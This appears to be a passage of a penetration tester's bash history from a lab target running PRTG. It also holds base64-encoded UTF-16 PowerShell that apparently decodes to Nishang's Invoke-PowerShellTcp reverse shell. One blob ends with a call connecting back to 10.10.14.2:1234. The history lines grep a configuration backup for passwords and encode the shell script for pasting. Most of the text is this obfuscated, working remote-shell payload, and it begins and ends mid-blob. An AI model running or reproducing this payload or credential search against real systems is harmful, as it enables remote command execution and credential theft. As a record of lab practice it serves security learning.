AQQBiAG8AdgBlACAAcwBoAG8AdwBzACAAYQBuACAAZQB4AGEAbQBwAGwAZQAgAG8AZgAgAGEAbgAgAGkAbgB0AGUAcgBhAGMAdABpAHYAZQAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIABiAGkAbgBkACAAYwBvAG4AbgBlAGMAdAAgAHMAaABlAGwAbAAuACAAVQBzAGUAIABhACAAbgBlAHQAYwBhAHQALwBwAG8AdwBlAHIAYwBhAHQAIAB0AG8AIABjAG8AbgBuAGUAYwB0ACAAdABvACAAdABoAGkAcwAgAHAAbwByAHQALgAKAAoALgBFAFgAQQBNAFAATABFAAoAUABTACAAPgAgAEkAbgB2AG8AawBlAC0AUABvAHcAZQByAFMAaABlAGwAbABUAGMAcAAgAC0AUgBlAHYAZQByAHMAZQAgAC0ASQBQAEEAZABkAHIAZQBzAHMAIABmAGUAOAAwADoAOgAyADAAYwA6ADIAOQBmAGYAOgBmAGUAOQBkADoAYgA5ADgAMwAgAC0AUABvAHIAdAAgADQANAA0ADQACgAKAEEAYgBvAHYAZQAgAHMAaABvAHcAcwAgAGEAbgAgAGUAeABhAG0AcABsAGUAIABvAGYAIABhAG4AIABpAG4AdABlAHIAYQBjAHQAaQB2AGUAIABQAG8AdwBlAHIAUwBoAGUAbABsACAAcgBlAHYAZQByAHMAZQAgAGMAbwBuAG4AZQBjAHQAIABzAGgAZQBsAGwAIABvAHYAZQByACAASQBQAHYANgAuACAAQQAgAG4AZQB0AGMAYQB0AC8AcABvAHcAZQByAGMAYQB0ACAAbABpAHMAdABlAG4AZQByACAAbQB1AHMAdAAgAGIAZQAKAGwAaQBzAHQAZQBuAGkAbgBnACAAbwBuACAAdABoAGUAIABnAGkAdgBlAG4AIABJAFAAIABhAG4AZAAgAHAAbwByAHQALgAKAAoALgBMAEkATgBLAAoAaAB0AHQAcAA6AC8ALwB3AHcAdwAuAGwAYQBiAG8AZgBhAHAAZQBuAGUAdAByAGEAdABpAG8AbgB0AGUAcwB0AGUAcgAuAGMAbwBtAC8AMgAwADEANQAvADAANQAvAHcAZQBlAGsALQBvAGYALQBwAG8AdwBlAHIAcwBoAGUAbABsAC0AcwBoAGUAbABsAHMALQBkAGEAeQAtADEALgBoAHQAbQBsAAoAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBuAGUAdAB0AGkAdAB1AGQAZQAvAHAAbwB3AGUAcgBzAGgAZQBsAGwALwBiAGwAbwBiAC8AbQBhAHMAdABlAHIALwBwAG8AdwBlAHIAZgB1AG4ALgBwAHMAMQAKAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AcwBhAG0AcgBhAHQAYQBzAGgAbwBrAC8AbgBpAHMAaABhAG4AZwAKACMAPgAKACAAIAAgACAAWwBDAG0AZABsAGUAdABCAGkAbgBkAGkAbgBnACgARABlAGYAYQB1AGwAdABQAGEAcgBhAG0AZQB0AGUAcgBTAGUAdABOAGEAbQBlAD0AIgByAGUAdgBlAHIAcwBlACIAKQBdACAAUABhAHIAYQBtACgACgAKACAAIAAgACAAIAAgACAAIABbAFAAYQByAGEAbQBlAHQAZQByACgAUABvAHMAaQB0AGkAbwBuACAAPQAgADAALAAgAE0AYQBuAGQAYQB0AG8AcgB5ACAAPQAgACQAdAByAHUAZQAsACAAUABhAHIAYQBtAGUAdABlAHIAUwBlAHQATgBhAG0AZQA9ACIAcgBlAHYAZQByAHMAZQAiACkAXQAKACAAIAAgACAAIAAgACAAIABbAFAAYQByAGEAbQBlAHQAZQByACgAUABvAHMAaQB0AGkAbwBuACAAPQAgADAALAAgAE0AYQBuAGQAYQB0AG8AcgB5ACAAPQAgACQAZgBhAGwAcwBlACwAIABQAGEAcgBhAG0AZQB0AGUAcgBTAGUAdABOAGEAbQBlAD0AIgBiAGkAbgBkACIAKQBdAAoAIAAgACAAIAAgACAAIAAgAFsAUwB0AHIAaQBuAGcAXQAKACAAIAAgACAAIAAgACAAIAAkAEkAUABBAGQAZAByAGUAcwBzACwACgAKACAAIAAgACAAIAAgACAAIABbAFAAYQByAGEAbQBlAHQAZQByACgAUABvAHMAaQB0AGkAbwBuACAAPQAgADEALAAgAE0AYQBuAGQAYQB0AG8AcgB5ACAAPQAgACQAdAByAHUAZQAsACAAUABhAHIAYQBtAGUAdABlAHIAUwBlAHQATgBhAG0AZQA9ACIAcgBlAHYAZQByAHMAZQAiACkAXQAKACAAIAAgACAAIAAgACAAIABbAFAAYQByAGEAbQBlAHQAZQByACgAUABvAHMAaQB0AGkAbwBuACAAPQAgADEALAAgAE0AYQBuAGQAYQB0AG8AcgB5ACAAPQAgACQAdAByAHUAZQAsACAAUABhAHIAYQBtAGUAdABlAHIAUwBlAHQATgBhAG0AZQA9ACIAYgBpAG4AZAAiACkAXQAKACAAIAAgACAAIAAgACAAIABbAEkAbgB0AF0ACgAgACAAIAAgACAAIAAgACAAJABQAG8AcgB0ACwACgAKACAAIAAgACAAIAAgACAAIABbAFAAYQByAGEAbQBlAHQAZQByACgAUABhAHIAYQBtAGUAdABlAHIAUwBlAHQATgBhAG0AZQA9ACIAcgBlAHYAZQByAHMAZQAiACkAXQAKACAAIAAgACAAIAAgACAAIABbAFMAdwBpAHQAYwBoAF0ACgAgACAAIAAgACAAIAAgACAAJABSAGUAdgBlAHIAcwBlACwACgAKACAAIAAgACAAIAAgACAAIABbAFAAYQByAGEAbQBlAHQAZQByACgAUABhAHIAYQBtAGUAdABlAHIAUwBlAHQATgBhAG0AZQA9ACIAYgBpAG4AZAAiACkAXQAKACAAIAAgACAAIAAgACAAIABbAFMAdwBpAHQAYwBoAF0ACgAgACAAIAAgACAAIAAgACAAJABCAGkAbgBkAAoACgAgACAAIAAgACkACgAKAAoAIAAgACAAIAB0AHIAeQAKACAAIAAgACAAewAKACAAIAAgACAAIAAgACAAIAAjAEMAbwBuAG4AZQBjAHQAIABiAGEAYwBrACAAaQBmACAAdABoAGUAIAByAGUAdgBlAHIAcwBlACAAcwB3AGkAdABjAGgAIABpAHMAIAB1AHMAZQBkAC4ACgAgACAAIAAgACAAIAAgACAAaQBmACAAKAAkAFIAZQB2AGUAcgBzAGUAKQAKACAAIAAgACAAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACQASQBQAEEAZABkAHIAZQBzAHMALAAkAFAAbwByAHQAKQAKACAAIAAgACAAIAAgACAAIAB9AAoACgAgACAAIAAgACAAIAAgACAAIwBCAGkAbgBkACAAdABvACAAdABoAGUAIABwAHIAbwB2AGkAZABlAGQAIABwAG8AcgB0ACAAaQBmACAAQgBpAG4AZAAgAHMAdwBpAHQAYwBoACAAaQBzACAAdQBzAGUAZAAuAAoAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAJABCAGkAbgBkACkACgAgACAAIAAgACAAIAAgACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAbABpAHMAdABlAG4AZQByACAAPQAgAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAGMAcABMAGkAcwB0AGUAbgBlAHIAXQAkAFAAbwByAHQACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAGwAaQBzAHQAZQBuAGUAcgAuAHMAdABhAHIAdAAoACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAGMAbABpAGUAbgB0ACAAPQAgACQAbABpAHMAdABlAG4AZQByAC4AQQBjAGMAZQBwAHQAVABjAHAAQwBsAGkAZQBuAHQAKAApAAoAIAAgACAAIAAgACAAIAAgAH0ACgAKACAAIAAgACAAIAAgACAAIAAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkACgAgACAAIAAgACAAIAAgACAAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0ACgAKACAAIAAgACAAIAAgACAAIAAjAFMAZQBuAGQAIABiAGEAYwBrACAAYwB1AHIAcgBlAG4AdAAgAHUAcwBlAHIAbgBhAG0AZQAgAGEAbgBkACAAYwBvAG0AcAB1AHQAZQByAG4AYQBtAGUACgAgACAAIAAgACAAIAAgACAAJABzAGUAbgBkAGIAeQB0AGUAcwAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACIAVwBpAG4AZABvAHcAcwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIAByAHUAbgBuAGkAbgBnACAAYQBzACAAdQBzAGUAcgAgACIAIAArACAAJABlAG4AdgA6AHUAcwBlAHIAbgBhAG0AZQAgACsAIAAiACAAbwBuACAAIgAgACsAIAAkAGUAbgB2ADoAYwBvAG0AcAB1AHQAZQByAG4AYQBtAGUAIAArACAAIgBgAG4AQwBvAHAAeQByAGkAZwBoAHQAIAAoAEMAKQAgADIAMAAxADUAIABNAGkAYwByAG8AcwBvAGYAdAAgAEMAbwByAHAAbwByAGEAdABpAG8AbgAuACAAQQBsAGwAIAByAGkAZwBoAHQAcwAgAHIAZQBzAGUAcgB2AGUAZAAuAGAAbgBgAG4AIgApAAoAIAAgACAAIAAgACAAIAAgACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQBzACwAMAAsACQAcwBlAG4AZABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApAAoACgAgACAAIAAgACAAIAAgACAAIwBTAGgAbwB3ACAAYQBuACAAaQBuAHQAZQByAGEAYwB0AGkAdgBlACAAUABvAHcAZQByAFMAaABlAGwAbAAgAHAAcgBvAG0AcAB0AAoAIAAgACAAIAAgACAAIAAgACQAcwBlAG4AZABiAHkAdABlAHMAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAnAFAAUwAgACcAIAArACAAKABHAGUAdAAtAEwAbwBjAGEAdABpAG8AbgApAC4AUABhAHQAaAAgACsAIAAnAD4AJwApAAoAIAAgACAAIAAgACAAIAAgACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQBzACwAMAAsACQAcwBlAG4AZABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApAAoACgAgACAAIAAgACAAIAAgACAAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQAKACAAIAAgACAAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABFAG4AYwBvAGQAZQBkAFQAZQB4AHQAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAZABhAHQAYQAgAD0AIAAkAEUAbgBjAG8AZABlAGQAVABlAHgAdAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQAcgB5AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIwBFAHgAZQBjAHUAdABlACAAdABoAGUAIABjAG8AbQBtAGEAbgBkACAAbwBuACAAdABoAGUAIAB0AGEAcgBnAGUAdAAuAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgAC0AQwBvAG0AbQBhAG4AZAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB9AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYwBhAHQAYwBoAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAVwByAGkAdABlAC0AVwBhAHIAbgBpAG4AZwAgACIAUwBvAG0AZQB0AGgAaQBuAGcAIAB3AGUAbgB0ACAAdwByAG8AbgBnACAAdwBpAHQAaAAgAGUAeABlAGMAdQB0AGkAbwBuACAAbwBmACAAYwBvAG0AbQBhAG4AZAAgAG8AbgAgAHQAaABlACAAdABhAHIAZwBlAHQALgAiAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABXAHIAaQB0AGUALQBFAHIAcgBvAHIAIAAkAF8ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB9AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABzAGUAbgBkAGIAYQBjAGsAMgAgACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAEcAZQB0AC0ATABvAGMAYQB0AGkAbwBuACkALgBQAGEAdABoACAAKwAgACcAPgAgACcACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHgAIAA9ACAAKAAkAGUAcgByAG8AcgBbADAAXQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAGUAcgByAG8AcgAuAGMAbABlAGEAcgAoACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrADIAIAArACAAJAB4AAoACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAjAFIAZQB0AHUAcgBuACAAdABoAGUAIAByAGUAcwB1AGwAdABzAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkACgAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAIAAgACAAIAAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQAKACAAIAAgACAAIAAgACAAIABpAGYAIAAoACQAbABpAHMAdABlAG4AZQByACkACgAgACAAIAAgACAAIAAgACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAbABpAHMAdABlAG4AZQByAC4AUwB0AG8AcAAoACkACgAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAfQAKACAAIAAgACAAYwBhAHQAYwBoAAoAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAIAAgAFcAcgBpAHQAZQAtAFcAYQByAG4AaQBuAGcAIAAiAFMAbwBtAGUAdABoAGkAbgBnACAAdwBlAG4AdAAgAHcAcgBvAG4AZwAhACAAQwBoAGUAYwBrACAAaQBmACAAdABoAGUAIABzAGUAcgB2AGUAcgAgAGkAcwAgAHIAZQBhAGMAaABhAGIAbABlACAAYQBuAGQAIAB5AG8AdQAgAGEAcgBlACAAdQBzAGkAbgBnACAAdABoAGUAIABjAG8AcgByAGUAYwB0ACAAcABvAHIAdAAuACIACgAgACAAIAAgACAAIAAgACAAVwByAGkAdABlAC0ARQByAHIAbwByACAAJABfAAoAIAAgACAAIAB9AAoACgB9AAoACgBJAG4AdgBvAGsAZQAtAFAAbwB3AGUAcgBTAGgAZQBsAGwAVABjAHAAIAAtAFIAZQB2AGUAcgBzAGUAIAAtAEkAUABBAGQAZAByAGUAcwBzACAAMQAwAC4AMQAwAC4AMQA0AC4AMgAgAC0AUABvAHIAdAAgADEAMgAzADQACgA=
 6816  2020-11-16 07:02  ls
 6817  2020-11-16 07:02  cd ..
 6818  2020-11-16 07:02  cd scans
 6819  2020-11-16 07:02  ls
 6820  2020-11-16 07:02  grep -B5 -A5 -i "password" PRTG\ Configuration.old.bak | sed 's/ //g' | sort
 6821  2020-11-16 07:04  cd ..
 6822  2020-11-16 07:04  cd exploit
 6823  2020-11-16 07:04  lsd
 6824  2020-11-16 07:04  ls
 6825  2020-11-16 07:05  cat shell.ps1 | iconv -t UTF-16LE | base64 -w0 | xclip
 6826  2020-11-16 07:05  ZgB1AG4AYwB0AGkAbwBuACAASQBuAHYAbwBrAGUALQBQAG8AdwBlAHIAUwBoAGUAbABsAFQAYwBwAAoAewAKADwAIwAKAC4AUwBZAE4ATwBQAFMASQBTAAoATgBpAHMAaABhAG4AZwAgAHMAYwByAGkAcAB0ACAAdwBoAGkAYwBoACAAYwBhAG4AIABiAGUAIAB1AHMAZQBkACAAZgBvAHIAIABSAGUAdgBlAHIAcwBlACAAbwByACAAQgBpAG4AZAAgAGkAbgB0AGUAcgBhAGMAdABpAHYAZQAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIABmAHIAbwBtACAAYQAgAHQAYQByAGcAZQB0AC4ACgAKAC4ARABFAFMAQwBSAEkAUABUAEkATwBOAAoAVABoAGkAcwAgAHMAYwByAGkAcAB0ACAAaQBzACAAYQBiAGwAZQAgAHQAbwAgAGMAbwBuAG4AZQBjAHQAIAB0AG8AIABhACAAcwB0AGEAbgBkAGEAcgBkACAAbgBlAHQAYwBhAHQAIABsAGkAcwB0AGUAbgBpAG4AZwAgAG8AbgAgAGEAIABwAG8AcgB0ACAAdwBoAGUAbgAgAHUAcwBpAG4AZwAgAHQAaABlACAALQBSAGUAdgBlAHIAcwBlACAAcwB3AGkAdABjAGgALgAKAEEAbABzAG8ALAAgAGEAIABzAHQAYQBuAGQAYQByAGQAIABuAGUAdABjAGEAdAAgAGMAYQBuACAAYwBvAG4AbgBlAGMAdAAgAHQAbwAgAHQAaABpAHMAIABzAGMAcgBpAHAAdAAgAEIAaQBuAGQAIAB0AG8AIABhACAAcwBwAGUAYwBpAGYAaQBjACAAcABvAHIAdAAuAAoACgBUAGgAZQAgAHMAYwByAGkAcAB0ACAAaQBzACAAZABlAHIAaQB2AGUAZAAgAGYAcgBvAG0AIABQAG8AdwBlAHIAZgB1AG4AIAB3AHIAaQB0AHQAZQBuACAAYgB5ACAAQgBlAG4AIABUAHUAcgBuAGUAcgAgACYAIABEAGEAdgBlACAASABhAHIAZAB5AAoACgAuAFAAQQBSAEEATQBFAFQARQBSACAASQBQAEEAZABkAHIAZQBzAHMACgBUAGgAZQAgAEkAUAAgAGEAZABkAHIAZQBzAHMAIAB0AG8AIABjAG8AbgBuAGUAYwB0ACAAdABvACAAdwBoAGUAbgAgAHUAcwBpAG4AZwAgAHQAaABlACAALQBSAGUAdgBlAHIAcwBlACAAcwB3AGkAdABjAGgALgAKAAoALgBQAEEAUgBBAE0ARQBUAEUAUgAgAFAAbwByAHQACgBUAGgAZQAgAHAAbwByAHQAIAB0AG8AIABjAG8AbgBuAGUAYwB0ACAAdABvACAAdwBoAGUAbgAgAHUAcwBpAG4AZwAgAHQAaABlACAALQBSAGUAdgBlAHIAcwBlACAAcwB3AGkAdABjAGgALgAgAFcAaABlAG4AIAB1AHMAaQBuAGcAIAAtAEIAaQBuAGQAIABpAHQAIABpAHMAIAB0AGgAZQAgAHAAbwByAHQAIABvAG4AIAB3AGgAaQBjAGgAIAB0AGgAaQBzACAAcwBjAHIAaQBwAHQAIABsAGkAcwB0AGUAbgBzAC4ACgAKAC4ARQBYAEEATQBQAEwARQAKAFAAUwAgAD4AIABJAG4AdgBvAGsAZQAtAFAAbwB3AGUAcgBTAGgAZQBsAGwAVABjAHAAIAAtAFIAZQB2AGUAcgBzAGUAIAAtAEkAUABBAGQAZAByAGUAcwBzACAAMQA5ADIALgAxADYAOAAuADEAMQA5AC4AMgAxADcAIAAtAFAAbwByAHQAIAAxADIAMwA0AAoACgBBAGIAbwB2AGUAIABzAGgAbwB3AHMAIABhAG4AIABlAHgAYQBtAHAAbABlACAAbwBmACAAYQBuACAAaQBuAHQAZQByAGEAYwB0AGkAdgBlACAAUABvAHcAZQByAFMAaABlAGwAbAAgAHIAZQB2AGUAcgBzAGUAIABjAG8AbgBuAGUAYwB0ACAAcwBoAGUAbABsAC4AIABBACAAbgBlAHQAYwBhAHQALwBwAG8AdwBlAHIAYwBhAHQAIABsAGkAcwB0AGUAbgBlAHIAIABtAHUAcwB0ACAAYgBlACAAbABpAHMAdABlAG4AaQBuAGcAIABvAG4ACgB0AGgAZQAgAGcAaQB2AGUAbgAgAEkAUAAgAGEAbgBkACAAcABvAHIAdAAuAAoACgAuAEUAWABBAE0AUABMAEUACgBQAFMAIAA+ACAASQBuAHYAbwBrAGUALQBQAG8AdwBlAHIAUwBoAGUAbABsAFQAYwBwACAALQBCAGkAbgBkACAALQBQAG8AcgB0ACAANAA0ADQANAAKAAoAQQBiAG8AdgBlACAAcwBoAG8AdwBzACAAYQBuACAAZQB4AGEAbQBwAGwAZQAgAG8AZgAgAGEAbgAgAGkAbgB0AGUAcgBhAGMAdABpAHYAZQAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIABiAGkAbgBkACAAYwBvAG4AbgBlAGMAdAAgAHMAaABlAGwAbAAuACAAVQBzAGUAIABhACAAbgBlAHQAYwBhAHQALwBwAG8AdwBlAHIAYwBhAHQAIAB0AG8AIABjAG8AbgBuAGUAYwB0ACAAdABvACAAdABoAGkAcwAgAHAAbwByAHQALgAKAAoALgBFAFgAQQBNAFAATABFAAoAUABTACAAPgAgAEkAbgB2AG8AawBlAC0AUABvAHcAZQByAFMAaABlAGwAbABUAGMAcAAgAC0AUgBlAHYAZQByAHMAZQAgAC0ASQBQAEEAZABkAHIAZQBzAHMAIABmAGUAOAAwADoAOgAyADAAYwA6ADIAOQBmAGYAOgBmAGUAOQBkADoAYgA5ADgAMwAgAC0AUABvAHIAdAAgADQANAA0ADQACgAKAEEAYgBvAHYAZQAgAHMAaABvAHcAcwAgAGEAbgAgAGUAeABhAG0AcABsAGUAIABvAGYAIABhAG4AIABpAG4AdABlAHIAYQBjAHQAaQB2AGUAIABQAG8AdwBlAHIAUwBoAGUAbABsACAAcgBlAHYAZQByAHMAZQAgAGMAbwBuAG4AZQBjAHQAIABzAGgAZQBsAGwAIABvAHYAZQByACAASQBQAHYANgAuACAAQQAgAG4AZQB0AGMAYQB0AC8AcABvAHcAZQByAGMAYQB0ACAAbABpAHMAdABlAG4AZQByACAAbQB1AHMAdAAgAGIAZQAKAGwAaQBzAHQAZQBuAGkAbgBnACAAbwBuACAAdABoAGUAIABnAGkAdgBlAG4AIABJAFAAIABhAG4AZAAgAHAAbwByAHQALgAKAAoALgBMAEkATgBLAAoAaAB0AHQAcAA6AC8ALwB3AHcAdwAuAGwAYQBiAG8AZgBhAHAAZQBuAGUAdAByAGEAdABpAG8AbgB0AGUAcwB0AGUAcgAuAGMAbwBtAC8AMgAwADEANQAvADAANQAvAHcAZQBlAGsALQBvAGYALQBwAG8AdwBlAHIAcwBoAGUAbABsAC0AcwBoAGUAbABsAHMALQBkAGEAeQAtADEALgBoAHQAbQBsAAoAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBuAGUAdAB0AGkAdAB1AGQAZQAvAHAAbwB3AGUAcgBzAGgAZQBsAGwALwBiAGwAbwBiAC8AbQBhAHMAdABlAHIALwBwAG8AdwBlAHIAZgB1AG4ALgBwAHMAMQAKAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AcwBhAG0AcgBhAHQAYQBzAGgAbwBrAC8AbgBpAHMAaABhAG4AZwAKACMAPgAKACAAIAAgACAAWwBDAG0AZABsAGUAdABCAGkAbgBkAGkAbgBnACgARABlAGYAYQB1AGwAdABQAGEAcgBhAG0AZQB0AGUAcgBTAGUAdABOAGEAbQBlAD0AIgByAGUAdgBlAHIAcwBlACIAKQBdACAAUABhAHIAYQBtACgACgAKACAAIAAgACAAIAAgACAAIABbAFAAYQByAGEAbQBlAHQAZQByACgAUABvAHMAaQB0AGkAbwBuACAAPQAgADAALAAgAE0AYQBuAGQAYQB0AG8AcgB5ACAAPQAgACQAdAByAHUAZQAsACAAUABhAHIAYQBtAGUAdABlAHIAUwBlAHQATgBhAG0AZQA9ACIAcgBlAHYAZQByAHMAZQAiACkAXQAKACAAIAAgACAAIAAgACAAIABbAFAAYQByAGEAbQBlAHQAZQByACgAUABvAHMAaQB0AGkAbwBuACAAPQAgADAALAAgAE0AYQBuAGQAYQB0AG8AcgB5ACAAPQAgACQAZgBhAGwAcwBlACwAIABQAGEAcgBhAG0AZQB0AGUAcgBTAGUAdABOAGEAbQBlAD0AIgBiAGkAbgBkACIAKQBdAAoAIAAgACAAIAAgACAAIAAgAFsAUwB0AHIAaQBuAGcAXQAKACAAIAAgACAAIAAgACAAIAAkAEkAUABBAGQAZAByAGUAcwBzACwACgAKACAAIAAgACAAIAAgACAAIABbAFAAYQByAGEAbQBlAHQAZQByACgAUABvAHMAaQB0AGkAbwBuACAAPQAgADEALAAgAE0AYQBuAGQAYQB0AG8AcgB5ACAAPQAgACQAdAByAHUAZQAsACAAUABhAHIAYQBtAGUAdABlAHIAUwBlAHQATgBhAG0AZQA9ACIAcgBlAHYAZQByAHMAZQAiACkAXQAKACAAIAAgACAAIAAgACAAIABbAFAAYQByAGEAbQBlAHQAZQByACgAUABvAHMAaQB0AGkAbwBuACAAPQAgADEALAAgAE0AYQBuAGQAYQB0AG8AcgB5ACAAPQAgACQAdAByAHUAZQAsACAAUABhAHIAYQBtAGUAdABlAHIAUwBlAHQATgBhAG0AZQA9ACIAYgBpAG4AZAAiACkAXQAKACAAIAAgACAAIAAgACAAIABbAEkAbgB0AF0ACgAgACAAIAAgACAAIAAgACAAJABQAG8AcgB0ACwACgAKACAAIAAgACAAIAAgACAAIABbAFAAYQByAGEAbQBlAHQAZQByACgAUABhAHIAYQBtAGUAdABlAHIAUwBlAHQATgBhAG0AZQA9ACIAcgBlAHYAZQByAHMAZQAiACkAXQAKACAAIAAgACAAIAAgACAAIABbAFMAdwBpAHQAYwBoAF0ACgAgACAAIAAgACAAIAAgACAAJABSAGUAdgBlAHIAcwBlACwACgAKACAAIAAgACAAIAAgACAAIABbAFAAYQByAGEAbQBlAHQAZQByACgAUABhAHIAYQBtAGUAdABlAHIAUwBlAHQATgBhAG0AZQA9ACIAYgBpAG4AZAAiACkAXQAKACAAIAAgACAAIAAgACAAIABbAFMAdwBpAHQAYwBoAF0ACgAgACAAIAAgACAAIAAgACAAJABCAGkAbgBkAAoACgAgACAAIAAgACkACgAKAAoAIAAgACAAIAB0AHIAeQAKACAAIAAgACAAewAKACAAIAAgACAAIAAgACAAIAAjAEMAbwBuAG4AZQBjAHQAIABiAGEAYwBrACAAaQBmACAAdABoAGUAIAByAGUAdgBlAHIAcwBlACAAcwB3AGkAdABjAGgAIABpAHMAIAB1AHMAZQBkAC4ACgAgACAAIAAgACAAIAAgACAAaQBmACAAKAAkAFIAZQB2AGUAcgBzAGUAKQAKACAAIAAgACAAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACQASQBQAEEAZABkAHIAZQBzAHMALAAkAFAAbwByAHQAKQAKACAAIAAgACAAIAAgACAAIAB9AAoACgAgACAAIAAgACAAIAAgACAAIwBCAGkAbgBkACAAdABvACAAdABoAGUAIABwAHIAbwB2AGkAZABlAGQAIABwAG8AcgB0ACAAaQBmACAAQgBpAG4AZAAgAHMAdwBpAHQAYwBoACAAaQBzACAAdQBzAGUAZAAuAAoAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAJABCAGkAbgBkACkACgAgACAAIAAgACAAIAAgACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAbABpAHMAdABlAG4AZQByACAAPQAgAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAGMAcABMAGkAcwB0AGUAbgBlAHIAXQAkAFAAbwByAHQACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAGwAaQBzAHQAZQBuAGUAcgAuAHMAdABhAHIAdAAoACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAGMAbABpAGUAbgB0ACAAPQAgACQAbABpAHMAdABlAG4AZQByAC4AQQBjAGMAZQBwAHQAVABjAHAAQwBsAGkAZQBuAHQAKAApAAoAIAAgACAAIAAgA